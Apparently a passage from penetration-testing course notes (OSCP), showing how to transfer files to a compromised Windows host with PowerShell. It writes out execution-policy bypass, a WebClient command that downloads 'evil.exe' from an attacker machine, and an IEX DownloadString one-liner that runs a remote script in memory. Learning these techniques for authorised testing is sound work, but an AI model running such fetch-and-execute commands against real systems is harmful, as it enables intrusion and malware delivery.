 
• Next, we will use -NoLogo and -NonInteractiveto hide the PowerShell logo banner and suppress the interactive PowerShell prompt, respectively.
 
• The -NoProfile keyword will prevent PowerShell from loading the default profile (which is notneeded), and finally we specify the script file with -File:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/65.jpg)

C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro
file -File wget.ps1
# - Executing the PowerShell HTTP downloader script

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/66.jpg)

C:\Users\Offsec> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http:/
/10.11.0.4/evil.exe', 'new-exploit.exe')
# - Executing the PowerShell HTTP downloader script as a one-liner

• If we want to download and execute a PowerShell script without saving it to disk, we can once againuse the System.Net.Webclient class.
 
• This is done by combining the DownloadString method withthe Invoke-Expression cmdlet (IEX).

• To demonstrate this, we will create a simple PowerShell script on our Kali machine (Listing 482):

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/67.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/68.jpg)




![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/69.jpg)

kali@kali:/var/www/html$ sudo cat helloworld.ps1Write-Output "Hello World"
# Listing 482 - The Hello World script hosted on our web server

• Next, we will run the script with the following command on our compromised Windows machine 

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/16/70.jpg)

C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('
http://10.11.0.4/helloworld.ps1')
Hello World


• The content of the PowerShell script was downloaded from our Kali machine and successfullyexecuted without saving it to the victim hard disk.


